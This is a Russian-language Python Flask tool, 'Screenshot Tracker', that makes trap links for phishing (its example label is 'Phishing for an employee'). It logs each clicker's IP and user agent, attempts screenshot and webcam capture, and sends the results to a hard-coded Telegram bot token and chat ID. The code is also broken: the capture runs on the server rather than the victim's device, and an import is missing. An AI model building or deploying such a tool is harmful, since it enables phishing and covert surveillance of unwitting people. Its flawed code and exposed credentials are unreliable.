#!/usr/bin/env python3
"""
Telegram Screenshot Tracker
Генерация ссылок, которые делают скриншот при переходе
"""

import os
import sys
import json
import uuid
import time
import base64
import hashlib
from datetime import datetime, timedelta
from threading import Thread
import logging
from io import BytesIO

# Установка логгирования
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

# Проверка зависимостей
REQUIRED_PACKAGES = [
    "flask",
    "requests",
    "pillow",
    "pyautogui"
]

try:
    from flask import Flask, request, redirect, jsonify, render_template_string
    import requests
    from PIL import ImageGrab, Image
    import pyautogui
    print("✅ Все зависимости установлены")
except ImportError as e:
    print(f"❌ Отсутствует зависимость: {e}")
    print(f"📦 Установите: pip install {' '.join(REQUIRED_PACKAGES)}")
    sys.exit(1)

# ========== КОНФИГУРАЦИЯ ==========
class config:

    @property
    def SCREENSHOTS_DIR(self):
        return os.path.join(self.CAPTURES_DIR, "screenshots")

    @property
    def CAMERA_DIR(self):
        return os.path.join(self.CAPTURES_DIR, "camera")

    # Telegram Bot Token (получите у @BotFather)
    TELEGRAM_TOKEN = "8413993403:AAFL8-2J4byWxkEwvvTFzuQ05Pcs6ypncn8"
    
    # Ваш Telegram ID (узнайте у @userinfobot)
    TELEGRAM_CHAT_ID = "5782683757"
    
    # Настройки сервера
    SERVER_HOST = "0.0.0.0"  # Для локального использования
    SERVER_PORT = 8080
    SERVER_URL = "https://kimberly-refractometric-nonorthographically.ngrok-free.dev"  # Измените на ваш домен
    
    # Настройки безопасности
    LINK_EXPIRE_HOURS = 24  # Ссылка действительна 24 часа
    SECRET_KEY = "supersecretkey"  # Измените на случайный ключ
    
    # НАСТРОЙКИ СКРИНШОТОВ И КАМЕРЫ
    SCREENSHOT_DELAY = 1  # Задержка перед скриншотом (секунды)
    CAMERA_DELAY = 1  # Задержка перед захватом камеры
    SAVE_SCREENSHOTS = True  # Сохранять ли захваченные файлы на диск
    CAPTURES_DIR = "captures"  # Основная директория для сохранения
    # Автоматические настройки (не менять)
    SCREENSHOTS_DIR = os.path.join(CAPTURES_DIR, "screenshots")
    CAMERA_DIR = os.path.join(CAPTURES_DIR, "camera")

# Автоматические настройки (не менять)
config = config()

# ========== БАЗА ДАННЫХ (JSON-файл) ==========
class LinkDatabase:
    def __init__(self, db_file="links_db.json"):
        self.db_file = db_file
        self.links = self._load_db()
    
    def _load_db(self):
        """Загрузка базы данных из JSON файла"""
        if os.path.exists(self.db_file):
            try:
                with open(self.db_file, 'r', encoding='utf-8') as f:
                    return json.load(f)
            except:
                return {}
        return {}
    
    def _save_db(self):
        """Сохранение базы данных в JSON файл"""
        try:
            with open(self.db_file, 'w', encoding='utf-8') as f:
                json.dump(self.links, f, indent=2, ensure_ascii=False)
            return True
        except Exception as e:
            logger.error(f"Ошибка сохранения БД: {e}")
            return False
    
    def create_link(self, name=None, metadata=None):
        """Создание новой ссылки"""
        link_id = str(uuid.uuid4())[:12]
        
        link_data = {
            "id": link_id,
            "created": datetime.now().isoformat(),
            "expires": (datetime.now() + timedelta(hours=config.LINK_EXPIRE_HOURS)).isoformat(),
            "name": name or f"Ссылка {link_id[:8]}",
            "clicks": 0,
            "last_click": None,
            "screenshots": [],
            "metadata": metadata or {},
            "active": True
        }
        
        self.links[link_id] = link_data
        self._save_db()
        
        # Генерация URL
        url = f"{config.SERVER_URL}/track/{link_id}"
        short_url = f"{config.SERVER_URL}/s/{link_id}"
        
        return {
            "id": link_id,
            "url": url,
            "short_url": short_url,
            "data": link_data
        }
    
    def get_link(self, link_id):
        """Получение данных ссылки"""
        return self.links.get(link_id)
    
    def record_click(self, link_id, ip_address, user_agent):
        """Запись перехода по ссылке"""
        if link_id not in self.links:
            return False
        
        link = self.links[link_id]
        
        # Проверка срока действия
        expires = datetime.fromisoformat(link["expires"])
        if datetime.now() > expires:
            link["active"] = False
            self._save_db()
            return False
        
        # Обновление статистики
        link["clicks"] += 1
        link["last_click"] = datetime.now().isoformat()
        
        # Запись информации о клике
        click_data = {
            "timestamp": datetime.now().isoformat(),
            "ip": ip_address,
            "user_agent": user_agent,
            "screenshot_taken": False
        }
        
        if "clicks_history" not in link:
            link["clicks_history"] = []
        
        link["clicks_history"].append(click_data)
        
        # Сохранение
        self._save_db()
        
        return True
    
    def record_screenshot(self, link_id, screenshot_data):
        """Запись информации о скриншоте"""
        if link_id not in self.links:
            return False
        
        link = self.links[link_id]
        
        if "screenshots" not in link:
            link["screenshots"] = []
        
        screenshot_info = {
            "timestamp": datetime.now().isoformat(),
            **screenshot_data
        }
        
        link["screenshots"].append(screenshot_info)
        
        # Обновляем последний клик
        if link["clicks_history"]:
            link["clicks_history"][-1]["screenshot_taken"] = True
        
        self._save_db()
        return True
    
    def get_all_links(self):
        """Получение всех ссылок"""
        return self.links
    
    def delete_link(self, link_id):
        """Удаление ссылки"""
        if link_id in self.links:
            del self.links[link_id]
            self._save_db()
            return True
        return False

# Инициализация базы данных
db = LinkDatabase()

# ========== ТЕЛЕГРАМ БОТ ==========
class TelegramNotifier:
    def __init__(self, token, chat_id):
        self.token = token
        self.chat_id = chat_id
        self.base_url = f"https://api.telegram.org/bot{token}"
        
        # Проверка доступности бота
        self.check_bot()
    
    def check_bot(self):
        """Проверка доступности бота"""
        try:
            response = requests.get(f"{self.base_url}/getMe")
            if response.status_code == 200:
                bot_info = response.json()
                logger.info(f"✅ Бот подключен: @{bot_info['result']['username']}")
                return True
            else:
                logger.error(f"❌ Ошибка подключения к боту: {response.status_code}")
                return False
        except Exception as e:
            logger.error(f"❌ Ошибка проверки бота: {e}")
            return False
    
    def send_message(self, text, parse_mode="HTML"):
        """Отправка текстового сообщения"""
        try:
            url = f"{self.base_url}/sendMessage"
            data = {
                "chat_id": self.chat_id,
                "text": text,
                "parse_mode": parse_mode
            }
            response = requests.post(url, data=data)
            return response.status_code == 200
        except Exception as e:
            logger.error(f"Ошибка отправки сообщения: {e}")
            return False
    
    def send_photo(self, photo_bytes, caption=""):
        """Отправка фото"""
        try:
            url = f"{self.base_url}/sendPhoto"
            
            # Сохраняем временно в файл
            temp_file = BytesIO(photo_bytes)
            temp_file.name = f"screenshot_{datetime.now().strftime('%Y%m%d_%H%M%S')}.jpg"
            
            files = {"photo": temp_file}
            data = {
                "chat_id": self.chat_id,
                "caption": caption
            }
            
            response = requests.post(url, files=files, data=data)
            return response.status_code == 200
        except Exception as e:
            logger.error(f"Ошибка отправки фото: {e}")
            return False
    
    def send_screenshot_notification(self, link_data, ip_address, user_agent, screenshot_path=None):
        """Отправка уведомления о захвате"""
        try:
            # Определяем, что было захвачено
            captures_count = len(link_data.get("captures", []))
            screenshot_count = sum(1 for c in link_data.get("captures", []) if c.get("type") == "screenshot")
            camera_count = sum(1 for c in link_data.get("captures", []) if c.get("type") == "camera")
        
            # Текст уведомления
            text = f"""
    🎯 <b>НОВЫЙ ЗАХВАТ ДАННЫХ!</b>

    📊 <b>Сводка захвата:</b>
    • 📸 Скриншотов экрана: {screenshot_count}
    • 📷 Фото с камеры: {camera_count}
    • 🕒 Время: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}

    👤 <b>Информация о цели:</b>
    • IP адрес: <code>{ip_address}</code>
    • User-Agent: {html.escape(user_agent[:80])}...

    🔗 <b>Информация о ссылке:</b>
    • ID: <code>{link_data['id']}</code>
    • Название: {html.escape(link_data['name'])}
    • Всего переходов: {link_data['clicks']}

    🌍 <b>Геолокация:</b>
    • IPInfo: https://ipinfo.io/{ip_address}
        """
        
        # Добавляем предупреждение о камере
            if camera_count > 0:
                text += "\n\n⚠️ <b>ВНИМАНИЕ:</b> Захвачено фото с веб-камеры!"
        
            return self.send_message(text)
        
        except Exception as e:
            logger.error(f"Ошибка отправки уведомления: {e}")
        return False
    
# Инициализация телеграм нотификатора
telegram = TelegramNotifier(config.TELEGRAM_TOKEN, config.TELEGRAM_CHAT_ID)

# ========== СКРИНШОТ УТИЛИТЫ ==========
class ScreenshotCapturer:
    @staticmethod
    def capture_screen():
        """Захват скриншота экрана"""
        try:
            # Задержка перед скриншотом
            time.sleep(config.SCREENSHOT_DELAY)
            
            # Захват скриншота
            screenshot = ImageGrab.grab()
            
            # Конвертация в байты
            img_byte_arr = BytesIO()
            screenshot.save(img_byte_arr, format='PNG', quality=85)
            img_byte_arr.seek(0)
            
            return img_byte_arr.getvalue()
            
        except Exception as e:
            logger.error(f"Ошибка захвата скриншота: {e}")
            return None
    
    @staticmethod
    def save_screenshot(image_bytes, link_id):
        """Сохранение скриншота на диск"""
        if not config.SAVE_SCREENSHOTS:  # Изменено с SAVE_CAPTURES
            return None
    
        try:
            # Создание директории
            os.makedirs(config.SCREENSHOTS_DIR, exist_ok=True)
        
            # Генерация имени файла
            timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
            filename = f"{link_id}_{timestamp}.png"
            filepath = os.path.join(config.SCREENSHOTS_DIR, filename)
        
        # Сохранение файла
            with open(filepath, 'wb') as f:
                f.write(image_bytes)
        
            return filepath
        
        except Exception as e:
            logger.error(f"Ошибка сохранения скриншота: {e}")
        return None

# ========== КАМЕРА УТИЛИТЫ ==========
class CameraCapturer:
    @staticmethod
    def capture_camera():
        """Захват фото с веб-камеры"""
        try:
            import cv2
            
            # Открываем камеру (0 - первая камера)
            cap = cv2.VideoCapture(0)
            
            if not cap.isOpened():
                logger.warning("⚠️ Веб-камера не найдена или недоступна")
                return None
            
            # Даем камере время на инициализацию
            time.sleep(1)
            
            # Захватываем кадр
            ret, frame = cap.read()
            
            # Освобождаем камеру
            cap.release()
            
            if not ret:
                logger.warning("⚠️ Не удалось захватить кадр с камеры")
                return None
            
            # Конвертируем BGR (OpenCV) в RGB
            frame_rgb = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
            
            # Конвертация в байты
            from PIL import Image
            img = Image.fromarray(frame_rgb)
            
            img_byte_arr = BytesIO()
            img.save(img_byte_arr, format='JPEG', quality=85)
            img_byte_arr.seek(0)
            
            return img_byte_arr.getvalue()
            
        except ImportError:
            logger.warning("⚠️ OpenCV не установлен. Установите: pip install opencv-python")
            return None
        except Exception as e:
            logger.error(f"Ошибка захвата с камеры: {e}")
            return None
    
    @staticmethod
    def save_camera_photo(image_bytes, link_id, camera_type="front"):
        """Сохранение фото с камеры на диск"""
        if not config.SAVE_SCREENSHOTS:  # Изменено с SAVE_CAPTURES
            return None
    
        try:
            # Создание директории для камеры
            os.makedirs(config.CAMERA_DIR, exist_ok=True)
        
            # Генерация имени файла
            timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
            filename = f"{link_id}_{camera_type}_{timestamp}.jpg"
            filepath = os.path.join(config.CAMERA_DIR, filename)
        
            # Сохранение файла
            with open(filepath, 'wb') as f:
                f.write(image_bytes)
        
            return filepath
        
        except Exception as e:
            logger.error(f"Ошибка сохранения фото с камеры: {e}")
        return None
    
# ========== FLASK СЕРВЕР ==========
app = Flask(__name__)
app.secret_key = config.SECRET_KEY

# HTML шаблоны
MAIN_PAGE = """
<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Screenshot Tracker</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }
        
        body {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            padding: 20px;
            display: flex;
            justify-content: center;
            align-items: center;
        }
        
        .container {
            background: white;
            border-radius: 20px;
            padding: 40px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
            max-width: 800px;
            width: 100%;
        }
        
        h1 {
            color: #333;
            margin-bottom: 30px;
            text-align: center;
            font-size: 2.5em;
        }
        
        .subtitle {
            color: #666;
            text-align: center;
            margin-bottom: 40px;
            font-size: 1.1em;
        }
        
        .form-group {
            margin-bottom: 25px;
        }
        
        label {
            display: block;
            margin-bottom: 8px;
            color: #555;
            font-weight: 600;
        }
        
        input[type="text"] {
            width: 100%;
            padding: 15px;
            border: 2px solid #e0e0e0;
            border-radius: 10px;
            font-size: 16px;
            transition: border 0.3s;
        }
        
        input[type="text"]:focus {
            outline: none;
            border-color: #667eea;
        }
        
        .btn {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            border: none;
            padding: 15px 30px;
            border-radius: 10px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: transform 0.2s, box-shadow 0.2s;
            display: block;
            width: 100%;
            margin-top: 20px;
        }
        
        .btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 10px 20px rgba(102, 126, 234, 0.4);
        }
        
        .link-result {
            margin-top: 30px;
            padding: 20px;
            background: #f8f9fa;
            border-radius: 10px;
            display: none;
        }
        
        .link-result.active {
            display: block;
            animation: fadeIn 0.5s;
        }
        
        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(10px); }
            to { opacity: 1; transform: translateY(0); }
        }
        
        .generated-link {
            display: flex;
            gap: 10px;
            margin-bottom: 15px;
        }
        
        .link-input {
            flex: 1;
            padding: 12px;
            border: 2px solid #e0e0e0;
            border-radius: 8px;
            background: white;
            font-size: 14px;
        }
        
        .copy-btn {
            background: #28a745;
            color: white;
            border: none;
            padding: 12px 20px;
            border-radius: 8px;
            cursor: pointer;
            font-weight: 600;
        }
        
        .copy-btn:hover {
            background: #218838;
        }
        
        .stats {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 20px;
            margin-top: 40px;
        }
        
        .stat-box {
            background: #f8f9fa;
            padding: 20px;
            border-radius: 10px;
            text-align: center;
        }
        
        .stat-number {
            font-size: 2em;
            font-weight: bold;
            color: #667eea;
            margin-bottom: 5px;
        }
        
        .stat-label {
            color: #666;
            font-size: 0.9em;
        }
        
        .links-list {
            margin-top: 40px;
        }
        
        .link-item {
            background: #f8f9fa;
            padding: 15px;
            border-radius: 10px;
            margin-bottom: 10px;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        
        .link-info {
            flex: 1;
        }
        
        .link-name {
            font-weight: 600;
            color: #333;
        }
        
        .link-url {
            color: #666;
            font-size: 0.9em;
            margin-top: 5px;
        }
        
        .link-stats {
            font-size: 0.8em;
            color: #888;
        }
        
        .delete-btn {
            background: #dc3545;
            color: white;
            border: none;
            padding: 8px 15px;
            border-radius: 6px;
            cursor: pointer;
            font-size: 0.9em;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>🕵️‍♂️ Screenshot Tracker</h1>
        <p class="subtitle">Генерируйте ссылки, которые делают скриншот при переходе</p>
        
        <form id="linkForm">
            <div class="form-group">
                <label for="linkName">Название ссылки (необязательно):</label>
                <input type="text" id="linkName" placeholder="Например: 'Фишинг для сотрудника'">
            </div>
            
            <button type="submit" class="btn">🎯 Сгенерировать ссылку</button>
        </form>
        
        <div id="linkResult" class="link-result">
            <h3>✅ Ссылка создана!</h3>
            
            <div class="generated-link">
                <input type="text" id="generatedLink" readonly class="link-input">
                <button onclick="copyLink()" class="copy-btn">📋 Копировать</button>
            </div>
            
            <div class="generated-link">
                <input type="text" id="shortLink" readonly class="link-input">
                <button onclick="copyShortLink()" class="copy-btn">🔗 Короткая</button>
            </div>
            
            <div style="margin-top: 15px;">
                <button onclick="testLink()" class="btn" style="background: #17a2b8;">🧪 Протестировать ссылку</button>
            </div>
        </div>
        
        <div class="stats">
            <div class="stat-box">
                <div class="stat-number" id="totalLinks">0</div>
                <div class="stat-label">Всего ссылок</div>
            </div>
            <div class="stat-box">
                <div class="stat-number" id="totalClicks">0</div>
                <div class="stat-label">Всего переходов</div>
            </div>
            <div class="stat-box">
                <div class="stat-number" id="activeLinks">0</div>
                <div class="stat-label">Активных ссылок</div>
            </div>
        </div>
        
        <div class="links-list" id="linksList">
            <h3>📋 Ваши ссылки:</h3>
            <!-- Список ссылок будет здесь -->
        </div>
    </div>
    
    <script>
        // Загрузка статистики
        async function loadStats() {
            try {
                const response = await fetch('/api/stats');
                const data = await response.json();
                
                document.getElementById('totalLinks').textContent = data.total_links;
                document.getElementById('totalClicks').textContent = data.total_clicks;
                document.getElementById('activeLinks').textContent = data.active_links;
                
                // Загрузка списка ссылок
                loadLinks();
            } catch (error) {
                console.error('Ошибка загрузки статистики:', error);
            }
        }
        
        // Загрузка списка ссылок
        async function loadLinks() {
            try {
                const response = await fetch('/api/links');
                const links = await response.json();
                
                const linksList = document.getElementById('linksList');
                let html = '<h3>📋 Ваши ссылки:</h3>';
                
                if (Object.keys(links).length === 0) {
                    html += '<p style="text-align: center; color: #666;">Нет созданных ссылок</p>';
                } else {
                    for (const [id, link] of Object.entries(links)) {
                        const created = new Date(link.created).toLocaleDateString();
                        const expires = new Date(link.expires).toLocaleDateString();
                        const status = link.active ? '🟢 Активна' : '🔴 Истекла';
                        
                        html += `
                            <div class="link-item">
                                <div class="link-info">
                                    <div class="link-name">${link.name}</div>
                                    <div class="link-url">/${id}</div>
                                    <div class="link-stats">
                                        👆 ${link.clicks} переходов • 📅 Создана: ${created} • ⏳ Истекает: ${expires} • ${status}
                                    </div>
                                </div>
                                <button onclick="deleteLink('${id}')" class="delete-btn">🗑 Удалить</button>
                            </div>
                        `;
                    }
                }
                
                linksList.innerHTML = html;
            } catch (error) {
                console.error('Ошибка загрузки ссылок:', error);
            }
        }
        
        // Генерация ссылки
        document.getElementById('linkForm').addEventListener('submit', async function(e) {
            e.preventDefault();
            
            const linkName = document.getElementById('linkName').value;
            
            try {
                const response = await fetch('/api/create', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({ name: linkName })
                });
                
                const data = await response.json();
                
                if (data.success) {
                    document.getElementById('generatedLink').value = data.url;
                    document.getElementById('shortLink').value = data.short_url;
                    document.getElementById('linkResult').classList.add('active');
                    
                    // Обновляем статистику
                    loadStats();
                }
            } catch (error) {
                console.error('Ошибка создания ссылки:', error);
                alert('Ошибка создания ссылки');
            }
        });
        
        // Копирование ссылки
        function copyLink() {
            const linkInput = document.getElementById('generatedLink');
            linkInput.select();
            document.execCommand('copy');
            alert('Ссылка скопирована в буфер обмена!');
        }
        
        function copyShortLink() {
            const linkInput = document.getElementById('shortLink');
            linkInput.select();
            document.execCommand('copy');
            alert('Короткая ссылка скопирована!');
        }
        
        // Тестирование ссылки
        function testLink() {
            const link = document.getElementById('generatedLink').value;
            window.open(link, '_blank');
        }
        
        // Удаление ссылки
        async function deleteLink(id) {
            if (!confirm('Удалить эту ссылку?')) return;
            
            try {
                const response = await fetch(`/api/delete/${id}`, {
                    method: 'DELETE'
                });
                
                const data = await response.json();
                
                if (data.success) {
                    loadStats();
                }
            } catch (error) {
                console.error('Ошибка удаления ссылки:', error);
            }
        }
        
        // Загрузка данных при старте
        document.addEventListener('DOMContentLoaded', loadStats);
        
        // Автообновление каждые 30 секунд
        setInterval(loadStats, 30000);
    </script>
</body>
</html>
"""

REDIRECT_PAGE = """
<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="refresh" content="0;url={{ redirect_url }}">
    <title>Перенаправление...</title>
    <style>
        body {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            color: white;
            text-align: center;
        }
        .container {
            background: rgba(255,255,255,0.1);
            padding: 40px;
            border-radius: 20px;
            backdrop-filter: blur(10px);
        }
        h1 {
            margin-bottom: 20px;
        }
        .loader {
            border: 5px solid rgba(255,255,255,0.3);
            border-top: 5px solid white;
            border-radius: 50%;
            width: 50px;
            height: 50px;
            animation: spin 1s linear infinite;
            margin: 20px auto;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>🔄 Перенаправление...</h1>
        <p>Пожалуйста, подождите, вас перенаправляют.</p>
        <div class="loader"></div>
    </div>
</body>
</html>
"""

# ========== API ЭНДПОИНТЫ ==========
@app.route('/')
def index():
    """Главная страница с генератором ссылок"""
    return render_template_string(MAIN_PAGE)

@app.route('/api/create', methods=['POST'])
def api_create_link():
    """API для создания ссылки"""
    try:
        data = request.get_json()
        name = data.get('name')
        
        result = db.create_link(name)
        
        logger.info(f"Создана новая ссылка: {result['id']} - {name}")
        
        return jsonify({
            "success": True,
            "id": result["id"],
            "url": result["url"],
            "short_url": result["short_url"],
            "name": result["data"]["name"]
        })
    except Exception as e:
        logger.error(f"Ошибка создания ссылки: {e}")
        return jsonify({"success": False, "error": str(e)}), 500

@app.route('/api/links')
def api_get_links():
    """API для получения всех ссылок"""
    return jsonify(db.get_all_links())

@app.route('/api/stats')
def api_get_stats():
    """API для получения статистики"""
    links = db.get_all_links()
    
    total_links = len(links)
    total_clicks = sum(link["clicks"] for link in links.values())
    
    # Активные ссылки (не истекшие)
    active_links = 0
    now = datetime.now()
    for link in links.values():
        expires = datetime.fromisoformat(link["expires"])
        if now < expires and link.get("active", True):
            active_links += 1
    
    return jsonify({
        "total_links": total_links,
        "total_clicks": total_clicks,
        "active_links": active_links
    })

@app.route('/api/delete/<link_id>', methods=['DELETE'])
def api_delete_link(link_id):
    """API для удаления ссылки"""
    try:
        success = db.delete_link(link_id)
        if success:
            logger.info(f"Удалена ссылка: {link_id}")
            return jsonify({"success": True})
        else:
            return jsonify({"success": False, "error": "Ссылка не найдена"}), 404
    except Exception as e:
        logger.error(f"Ошибка удаления ссылки: {e}")
        return jsonify({"success": False, "error": str(e)}), 500

# ========== ТРЕКИНГОВЫЕ ЭНДПОИНТЫ ==========
@app.route('/track/<link_id>')
def track_link(link_id):
    """Основной эндпоинт для трекинга (делает скриншот)"""
    try:
        # Получение информации о клиенте
        ip_address = request.headers.get('X-Forwarded-For', request.remote_addr)
        user_agent = request.headers.get('User-Agent', 'Unknown')
        
        # Запись клика в БД
        if not db.record_click(link_id, ip_address, user_agent):
            return "Ссылка недействительна или истекла", 404
        
        # Получение данных ссылки
        link_data = db.get_link(link_id)
        
        # Захват скриншота в отдельном потоке
        Thread(target=capture_and_send_screenshot, args=(link_id, ip_address, user_agent, link_data), daemon=True).start()
        
        # Перенаправление на реальный сайт
        redirect_url = "google.com"  # Измените на нужный URL
        
        return render_template_string(REDIRECT_PAGE, redirect_url=redirect_url)
        
    except Exception as e:
        logger.error(f"Ошибка трекинга: {e}")
        return "Ошибка обработки запроса", 500

@app.route('/s/<link_id>')
def short_link(link_id):
    """Короткая версия ссылки"""
    return track_link(link_id)

def capture_and_send_screenshot(link_id, ip_address, user_agent, link_data):
    """Захват и отправка скриншота и фото с камеры"""
    try:
        logger.info(f"Запуск захвата для ссылки {link_id}...")
        
        # Создаем списки для результатов
        captured_files = []
        telegram_messages = []
        
        # 1. ЗАХВАТ СКРИНШОТА ЭКРАНА
        logger.info("📸 Захват скриншота экрана...")
        screenshot_bytes = ScreenshotCapturer.capture_screen()
        
        if screenshot_bytes:
            # Сохранение на диск
            saved_path = ScreenshotCapturer.save_screenshot(screenshot_bytes, link_id)
            
            # Запись в БД
            screenshot_info = {
                "type": "screenshot",
                "size": len(screenshot_bytes),
                "filename": saved_path if saved_path else "memory_only",
                "timestamp": datetime.now().isoformat()
            }
            
            # Обновляем БД
            if "captures" not in link_data:
                link_data["captures"] = []
            link_data["captures"].append(screenshot_info)
            db.record_screenshot(link_id, screenshot_info)
            
            captured_files.append(("screenshot", screenshot_bytes, saved_path))
            telegram_messages.append("📸 **Скриншот экрана**")
            
            logger.info("✅ Скриншот экрана захвачен")
        else:
            logger.warning("⚠️ Не удалось захватить скриншот экрана")
        
        # 2. ЗАХВАТ ФОТО С ВЕБ-КАМЕРЫ
        logger.info("📷 Захват фото с веб-камеры...")
        camera_bytes = CameraCapturer.capture_camera()
        
        if camera_bytes:
            # Сохранение на диск
            saved_camera_path = CameraCapturer.save_camera_photo(camera_bytes, link_id, "webcam")
            
            # Запись в БД
            camera_info = {
                "type": "camera",
                "size": len(camera_bytes),
                "filename": saved_camera_path if saved_camera_path else "memory_only",
                "timestamp": datetime.now().isoformat()
            }
            
            link_data["captures"].append(camera_info)
            
            captured_files.append(("camera", camera_bytes, saved_camera_path))
            telegram_messages.append("📷 **Фото с веб-камеры**")
            
            logger.info("✅ Фото с веб-камеры захвачено")
        else:
            logger.warning("⚠️ Не удалось захватить фото с камеры")
        
        # 3. ОТПРАВКА В TELEGRAM
        if telegram.check_bot() and (screenshot_bytes or camera_bytes):
            # Отправляем основное уведомление
            notification_sent = telegram.send_screenshot_notification(
                link_data, ip_address, user_agent, 
                saved_path if screenshot_bytes else saved_camera_path
            )
            
            if notification_sent:
                logger.info("📨 Основное уведомление отправлено в Telegram")
            
            # Отправляем все захваченные медиафайлы
            for file_type, file_bytes, file_path in captured_files:
                try:
                    caption = ""
                    if file_type == "screenshot":
                        caption = f"🖥 **СКРИНШОТ ЭКРАНА**\nВремя: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
                    elif file_type == "camera":
                        caption = f"📷 **ФОТО С ВЕБ-КАМЕРЫ**\nВремя: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
                    
                    # Добавляем информацию о цели
                    caption += f"\n\n🎯 **Цель:**"
                    caption += f"\n• IP: `{ip_address}`"
                    caption += f"\n• Ссылка: {link_data['name']}"
                    caption += f"\n• User-Agent: {user_agent[:50]}..."
                    
                    # Отправляем файл
                    if file_type == "screenshot":
                        telegram.send_photo(file_bytes, caption)
                    elif file_type == "camera":
                        telegram.send_photo(file_bytes, caption)
                    
                    logger.info(f"✅ {file_type} отправлен в Telegram")
                    
                    # Небольшая задержка между отправками
                    time.sleep(1)
                    
                except Exception as e:
                    logger.error(f"❌ Ошибка отправки {file_type}: {e}")
        
        else:
            logger.warning("⚠️ Бот недоступен или нечего отправлять")
            
        # 4. ФИНАЛЬНОЕ СОХРАНЕНИЕ В БД
        db._save_db()
            
    except Exception as e:
        logger.error(f"❌ Ошибка обработки захвата: {e}")
        import traceback
        logger.error(traceback.format_exc())

# Проверка доступности камеры
def check_camera_available():
    """Проверка доступности веб-камеры"""
    try:
        import cv2
        cap = cv2.VideoCapture(0)
        if cap.isOpened():
            logger.info("✅ Веб-камера доступна")
            cap.release()
            return True
        else:
            logger.warning("⚠️ Веб-камера не найдена")
            return False
    except ImportError:
        logger.warning("⚠️ OpenCV не установлен. Захват с камеры недоступен.")
        logger.info("📦 Установите: pip install opencv-python")
        return False
    except Exception as e:
        logger.error(f"❌ Ошибка проверки камеры: {e}")
        return False

# В функции start_server() добавьте:
logger.info(f"📷 Проверка камеры...")
check_camera_available()

# ========== ЗАПУСК СЕРВЕРА ==========
def start_server():
    """Запуск Flask сервера"""
    try:
        logger.info(f"🚀 Запуск сервера на {config.SERVER_HOST}:{config.SERVER_PORT}")
        logger.info(f"📊 Веб-интерфейс: http://{config.SERVER_HOST}:{config.SERVER_PORT}")
        logger.info(f"🤖 Telegram бот настроен на ID: {config.TELEGRAM_CHAT_ID}")
        
        # Проверка директорий
        if config.SAVE_SCREENSHOTS:
            os.makedirs(config.SCREENSHOTS_DIR, exist_ok=True)
            logger.info(f"📁 Скриншоты сохраняются в: {config.SCREENSHOTS_DIR}")
        
        app.run(
            host=config.SERVER_HOST,
            port=config.SERVER_PORT,
            debug=False,
            threaded=True
        )
        
    except Exception as e:
        logger.error(f"❌ Ошибка запуска сервера: {e}")
        sys.exit(1)

if __name__ == "__main__":
    print("=" * 60)
    print("🕵️‍♂️ SCREENSHOT TRACKER v1.0")
    print("=" * 60)
    print("📌 Функции:")
    print("  • Генерация уникальных ссылок-ловушек")
    print("  • Автоматический скриншот при переходе")
    print("  • Отправка в Telegram бота")
    print("  • Веб-интерфейс управления")
    print("  • Статистика и аналитика")
    print("=" * 60)
    
    # Проверка конфигурации
    if config.TELEGRAM_TOKEN == "8413993403:AAFL8-2J4byWxkEwvvTFzuQ05Pcs6ypncn8":
        print("⚠️ ВНИМАНИЕ: Используется демо токен Telegram бота!")
        print("   Получите свой токен у @BotFather")
        print("   и измените TELEGRAM_TOKEN в конфигурации")
    
    if config.SERVER_URL == "http://localhost:8080":
        print("⚠️ ВНИМАНИЕ: Сервер настроен на localhost")
        print("   Для работы из интернета:")
        print("   1. Используйте ngrok: ngrok http 8080")
        print("   2. Измените SERVER_URL на ваш домен")
    
    print("\n🚀 Запускаю сервер...")
    start_server()

    